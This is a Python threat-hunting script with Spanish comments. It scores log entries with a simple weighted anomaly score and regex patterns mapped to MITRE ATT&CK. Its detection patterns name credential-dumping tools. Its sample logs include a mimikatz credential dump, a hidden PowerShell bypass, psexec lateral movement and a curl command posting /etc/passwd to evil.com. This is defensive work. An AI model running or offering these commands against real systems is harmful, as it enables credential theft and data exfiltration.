
#!/usr/bin/env python3
"""
BOFA AI-Powered Threat Hunter v2.0
Detecta amenazas usando machine learning local y correlaci√≥n de eventos
Author: @descambiado
"""

import json
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
import pickle
import re
from typing import Dict, List, Any
import hashlib
import yaml
import os

class ThreatHunter:
    def __init__(self):
        self.anomaly_threshold = 0.7
        self.mitre_mappings = self.load_mitre_mappings()
        self.ml_model = self.load_or_create_model()
        self.threat_patterns = self.load_threat_patterns()
        
    def load_mitre_mappings(self) -> Dict:
        """Carga mapeos de MITRE ATT&CK"""
        return {
            "T1055": {"name": "Process Injection", "severity": "high"},
            "T1003": {"name": "OS Credential Dumping", "severity": "critical"},
            "T1082": {"name": "System Information Discovery", "severity": "medium"},
            "T1070": {"name": "Indicator Removal", "severity": "high"},
            "T1059": {"name": "Command and Scripting Interpreter", "severity": "medium"},
            "T1190": {"name": "Exploit Public-Facing Application", "severity": "critical"},
            "T1566": {"name": "Phishing", "severity": "high"},
            "T1105": {"name": "Ingress Tool Transfer", "severity": "medium"}
        }
    
    def load_threat_patterns(self) -> List[Dict]:
        """Carga patrones de amenazas conocidas"""
        return [
            {
                "name": "Suspicious PowerShell",
                "pattern": r"powershell.*(invoke|download|bypass|hidden|encoded)",
                "mitre_id": "T1059.001",
                "severity": "high"
            },
            {
                "name": "Credential Dumping",
                "pattern": r"(mimikatz|sekurlsa|lsadump|hashdump)",
                "mitre_id": "T1003",
                "severity": "critical"
            },
            {
                "name": "Lateral Movement",
                "pattern": r"(psexec|wmic|schtasks).*\\\\",
                "mitre_id": "T1021",
                "severity": "high"
            },
            {
                "name": "Data Exfiltration",
                "pattern": r"(curl|wget|ftp).*\.(txt|doc|pdf|xlsx)",
                "mitre_id": "T1041",
                "severity": "medium"
            }
        ]
    
    def load_or_create_model(self):
        """Carga o crea modelo ML b√°sico"""
        # Simulaci√≥n de modelo ML - en producci√≥n usar√≠a scikit-learn
        return {
            "version": "1.0",
            "features": ["command_length", "special_chars", "time_anomaly", "user_anomaly"],
            "weights": [0.2, 0.3, 0.25, 0.25]
        }
    
    def extract_features(self, log_entry: Dict) -> List[float]:
        """Extrae caracter√≠sticas del log para ML"""
        command = log_entry.get('command', '')
        user = log_entry.get('user', '')
        timestamp = log_entry.get('timestamp', '')
        
        features = []
        
        # Feature 1: Longitud del comando (normalizada)
        features.append(min(len(command) / 100.0, 1.0))
        
        # Feature 2: Caracteres especiales
        special_chars = len(re.findall(r'[&|;`$<>{}()]', command))
        features.append(min(special_chars / 10.0, 1.0))
        
        # Feature 3: Anomal√≠a temporal (horario inusual)
        if timestamp:
            try:
                dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
                hour = dt.hour
                # Horario inusual: 00-06 o 22-23
                time_anomaly = 1.0 if (hour <= 6 or hour >= 22) else 0.0
                features.append(time_anomaly)
            except:
                features.append(0.0)
        else:
            features.append(0.0)
        
        # Feature 4: Usuario privilegiado
        privileged_users = ['root', 'administrator', 'admin', 'system']
        user_anomaly = 1.0 if user.lower() in privileged_users else 0.0
        features.append(user_anomaly)
        
        return features
    
    def calculate_anomaly_score(self, features: List[float]) -> float:
        """Calcula puntuaci√≥n de anomal√≠a usando modelo ML"""
        weights = self.ml_model["weights"]
        score = sum(f * w for f, w in zip(features, weights))
        return min(score, 1.0)
    
    def pattern_matching(self, log_entry: Dict) -> List[Dict]:
        """Busca patrones conocidos de amenazas"""
        command = log_entry.get('command', '').lower()
        matches = []
        
        for pattern in self.threat_patterns:
            if re.search(pattern["pattern"], command, re.IGNORECASE):
                matches.append({
                    "pattern_name": pattern["name"],
                    "mitre_id": pattern["mitre_id"],
                    "severity": pattern["severity"],
                    "mitre_info": self.mitre_mappings.get(pattern["mitre_id"], {})
                })
        
        return matches
    
    def hunt_threats(self, log_data: List[Dict]) -> Dict:
        """Funci√≥n principal de hunting"""
        results = {
            "total_logs": len(log_data),
            "threats_detected": [],
            "anomalies": [],
            "mitre_techniques": set(),
            "severity_counts": {"critical": 0, "high": 0, "medium": 0, "low": 0},
            "timeline": [],
            "recommendations": []
        }
        
        print(f"[INFO] Analizando {len(log_data)} entradas de log...")
        print("[INFO] Aplicando modelos de ML y pattern matching...")
        
        for idx, log_entry in enumerate(log_data):
            # An√°lisis ML
            features = self.extract_features(log_entry)
            anomaly_score = self.calculate_anomaly_score(features)
            
            # Pattern matching
            pattern_matches = self.pattern_matching(log_entry)
            
            # Si hay anomal√≠a o patrones, registrar
            if anomaly_score > self.anomaly_threshold or pattern_matches:
                threat = {
                    "log_id": idx,
                    "timestamp": log_entry.get('timestamp', ''),
                    "source": log_entry.get('source', ''),
                    "user": log_entry.get('user', ''),
                    "command": log_entry.get('command', ''),
                    "anomaly_score": round(anomaly_score, 3),
                    "patterns_matched": pattern_matches,
                    "severity": self.determine_severity(anomaly_score, pattern_matches)
                }
                
                results["threats_detected"].append(threat)
                
                # Actualizar contadores
                results["severity_counts"][threat["severity"]] += 1
                
                # Agregar t√©cnicas MITRE
                for match in pattern_matches:
                    results["mitre_techniques"].add(match["mitre_id"])
                
                # Timeline
                results["timeline"].append({
                    "timestamp": threat["timestamp"],
                    "event": f"Threat detected: {threat['severity']} severity",
                    "details": threat["patterns_matched"]
                })
        
        # Convertir set a list para JSON
        results["mitre_techniques"] = list(results["mitre_techniques"])
        
        # Generar recomendaciones
        results["recommendations"] = self.generate_recommendations(results)
        
        print(f"[SUCCESS] Threats detectadas: {len(results['threats_detected'])}")
        print(f"[INFO] T√©cnicas MITRE identificadas: {len(results['mitre_techniques'])}")
        
        return results
    
    def determine_severity(self, anomaly_score: float, patterns: List[Dict]) -> str:
        """Determina severidad basada en score y patrones"""
        if any(p["severity"] == "critical" for p in patterns):
            return "critical"
        elif any(p["severity"] == "high" for p in patterns) or anomaly_score > 0.9:
            return "high"
        elif any(p["severity"] == "medium" for p in patterns) or anomaly_score > 0.8:
            return "medium"
        else:
            return "low"
    
    def generate_recommendations(self, results: Dict) -> List[str]:
        """Genera recomendaciones basadas en resultados"""
        recommendations = []
        
        if results["severity_counts"]["critical"] > 0:
            recommendations.append("üö® CR√çTICO: Revisar inmediatamente las amenazas cr√≠ticas detectadas")
            recommendations.append("üîí Implementar controles adicionales para t√©cnicas MITRE identificadas")
        
        if results["severity_counts"]["high"] > 5:
            recommendations.append("‚ö†Ô∏è Alto volumen de amenazas de alta severidad - posible campa√±a coordinada")
        
        if "T1003" in results["mitre_techniques"]:
            recommendations.append("üîê Detectado credential dumping - cambiar credenciales comprometidas")
        
        if "T1055" in results["mitre_techniques"]:
            recommendations.append("üõ°Ô∏è Process injection detectado - revisar integridad de procesos")
        
        total_threats = len(results["threats_detected"])
        if total_threats > results["total_logs"] * 0.1:
            recommendations.append(f"üìä {total_threats} amenazas en {results['total_logs']} logs - revisar configuraci√≥n de seguridad")
        
        return recommendations

def main():
    """Funci√≥n principal"""
    hunter = ThreatHunter()
    
    # Datos de ejemplo (en producci√≥n vendr√≠a de archivos de log)
    sample_logs = [
        {
            "timestamp": "2025-01-20T14:30:00Z",
            "source": "server01",
            "user": "admin",
            "command": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest\"",
            "process": "powershell.exe"
        },
        {
            "timestamp": "2025-01-20T02:15:00Z",
            "source": "workstation05",
            "user": "jdoe",
            "command": "mimikatz sekurlsa::logonpasswords",
            "process": "cmd.exe"
        },
        {
            "timestamp": "2025-01-20T15:45:00Z",
            "source": "server02",
            "user": "service_account",
            "command": "psexec \\\\target-server cmd.exe",
            "process": "psexec.exe"
        },
        {
            "timestamp": "2025-01-20T10:30:00Z",
            "source": "workstation01",
            "user": "user123",
            "command": "dir C:\\Users",
            "process": "cmd.exe"
        },
        {
            "timestamp": "2025-01-20T23:45:00Z",
            "source": "server03",
            "user": "root",
            "command": "curl -X POST https://evil.com/exfil -d @/etc/passwd",
            "process": "curl"
        }
    ]
    
    print("üîç BOFA AI-Powered Threat Hunter v2.0")
    print("=" * 50)
    
    # Ejecutar hunting
    results = hunter.hunt_threats(sample_logs)
    
    # Mostrar resultados
    print("\nüìä RESUMEN DE RESULTADOS")
    print("=" * 30)
    print(f"Total logs analizados: {results['total_logs']}")
    print(f"Amenazas detectadas: {len(results['threats_detected'])}")
    print(f"T√©cnicas MITRE: {len(results['mitre_techniques'])}")
    
    print("\nüö® SEVERIDAD")
    for severity, count in results['severity_counts'].items():
        if count > 0:
            print(f"{severity.upper()}: {count}")
    
    print("\nüéØ T√âCNICAS MITRE ATT&CK DETECTADAS")
    for technique in results['mitre_techniques']:
        info = hunter.mitre_mappings.get(technique, {})
        print(f"- {technique}: {info.get('name', 'Unknown')} ({info.get('severity', 'unknown')})")
    
    print("\nüí° RECOMENDACIONES")
    for i, rec in enumerate(results['recommendations'], 1):
        print(f"{i}. {rec}")
    
    print("\nüîç AMENAZAS DETALLADAS")
    for threat in results['threats_detected'][:3]:  # Mostrar solo las primeras 3
        print(f"\n--- Threat ID: {threat['log_id']} ---")
        print(f"Timestamp: {threat['timestamp']}")
        print(f"Usuario: {threat['user']}")
        print(f"Comando: {threat['command'][:80]}...")
        print(f"Anomaly Score: {threat['anomaly_score']}")
        print(f"Severidad: {threat['severity'].upper()}")
        if threat['patterns_matched']:
            print("Patrones detectados:")
            for pattern in threat['patterns_matched']:
                print(f"  - {pattern['pattern_name']} ({pattern['mitre_id']})")
    
    # Exportar resultados
    output_file = f"threat_hunting_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\n‚úÖ Resultados exportados a: {output_file}")
    print("üîç Threat hunting completado exitosamente!")

if __name__ == "__main__":
    main()
